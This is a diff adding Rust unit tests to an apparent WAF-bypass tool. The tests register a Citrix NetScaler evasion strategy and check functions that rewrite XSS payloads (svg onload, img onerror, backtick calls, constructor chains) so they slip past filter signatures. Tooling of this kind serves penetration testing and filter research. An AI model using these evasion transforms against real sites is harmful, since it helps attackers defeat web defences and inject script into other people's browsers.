@@ -257,6 +257,7 @@ fn test_every_waf_has_strategy() {
         WafType::CloudArmor,
         WafType::Fastly,
         WafType::Wordfence,
+        WafType::Citrix,
         WafType::Unknown("test".to_string()),
     ];
     for waf in &waf_types {
@@ -437,4 +438,70 @@ fn test_exotic_whitespace() {
 fn test_exotic_whitespace_svg() {
     let result = exotic_whitespace("<svg onload=alert(1)>");
     assert!(result.contains('\x0B') || result.contains('\x0C'));
+}
+
+/// The literal `alert(1)` table is gone; backtick_parens now fires on any
+/// sink-call argument. These shapes used to no-op and silently lose a
+/// bypass variant against real payloads.
+#[test]
+fn test_backtick_parens_generalizes_over_arguments() {
+    // Member-access argument interpolates so it still evaluates.
+    assert_eq!(
+        backtick_parens("<svg onload=alert(document.domain)>"),
+        "<svg onload=alert`${document.domain}`>"
+    );
+    // Quoted string literal collapses to its inner text.
+    assert_eq!(backtick_parens("alert('XSS')"), "alert`XSS`");
+    // Argument-less sink call.
+    assert_eq!(backtick_parens("print()"), "print``");
+    // Sink embedded in an attribute, with following markup preserved.
+    assert_eq!(
+        backtick_parens("<img src=x onerror=confirm(1)>"),
+        "<img src=x onerror=confirm`1`>"
+    );
+    // Regex argument interpolates rather than dropping the bypass.
+    assert_eq!(backtick_parens("alert(/xss/)"), "alert`${/xss/}`");
+}
+
+/// constructor_chain now wraps arbitrary sink calls and picks a quote
+/// char that keeps the wrapped string valid even when the argument is
+/// itself quoted.
+#[test]
+fn test_constructor_chain_generalizes_over_arguments() {
+    // Single-quoted argument forces the wrapper to double quotes.
+    assert_eq!(
+        constructor_chain("alert('XSS')"),
+        "[].constructor.constructor(\"alert('XSS')\")()"
+    );
+    // Member access wraps cleanly in single quotes.
+    assert_eq!(
+        constructor_chain("alert(document.domain)"),
+        "[].constructor.constructor('alert(document.domain)')()"
+    );
+    // Embedded in markup: only the call is rewritten.
+    assert_eq!(
+        constructor_chain("<img src=x onerror=prompt(1)>"),
+        "<img src=x onerror=[].constructor.constructor('prompt(1)')()>"
+    );
+}
+
+#[test]
+fn test_find_sink_call_balances_nested_parens() {
+    // The argument carries its own parens; the call must close on the
+    // matching outer `)`, not the first one.
+    let (start, open, close) = find_sink_call("alert(String(1))").unwrap();
+    assert_eq!(start, 0);
+    assert_eq!(&"alert(String(1))"[open..=close], "(String(1))");
+}
+
+#[test]
+fn test_citrix_netscaler_strategy() {
+    let strategy = get_bypass_strategy(&WafType::Citrix);
+    assert!(!strategy.extra_encoders.is_empty());
+    assert!(!strategy.mutations.is_empty());
+    // Signature-driven WAF: must exercise the literal-shape-breaking
+    // mutations.
+    assert!(strategy.mutations.contains(&MutationType::HtmlCommentSplit));
+    assert!(strategy.mutations.contains(&MutationType::CaseAlternation));
+    assert!(strategy.extra_encoders.contains(&"unicode".to_string()));
 }
